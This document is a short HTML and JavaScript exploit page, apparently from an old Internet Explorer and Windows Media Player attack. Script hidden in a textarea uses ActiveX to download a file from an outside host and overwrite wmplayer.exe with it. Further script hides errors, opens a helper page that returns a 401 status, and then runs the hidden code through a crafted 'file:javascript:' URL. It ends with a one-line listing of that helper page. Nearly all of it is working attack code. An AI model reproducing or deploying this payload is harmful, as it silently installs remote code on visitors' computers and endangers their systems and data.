<textarea id="code" style="display:none;">
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET", "http://sonyasys.com/48",0);
x.Send();
var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
location.href = "mms://";
</textarea>


<script language="JavaScript">
<!--

function SymError()
{
  return true;
}

window.onerror = SymError;

//-->
</script>

<script language="javascript">

function preparecode(code) {
result = '';
lines = code.split(/\r\n/);
for (i=0;i<lines.length;i++) {

line = lines[i];
line = line.replace(/^\s+/,"");
line = line.replace(/\s+$/,"");
line = line.replace(/'/g,"\\'");
line = line.replace(/[\\]/g,"\\\\");
line = line.replace(/[/]/g,"%2f");
if (line != '') {
result += line +'\\r\\n';
}
}
return result;
}

function doit() {
mycode = preparecode(document.all.code.value);
myURL = "file:javascript:eval('" + mycode + "')";
window.open(myURL,"_media")
}

window.open("error.jsp","_media");
setTimeout("doit()", 10000);
</script>

--snip--

error.jsp is a jsp page that consists of one line, namely

<% response.setStatus(HttpServletResponse.SC_UNAUTHORIZED); %>

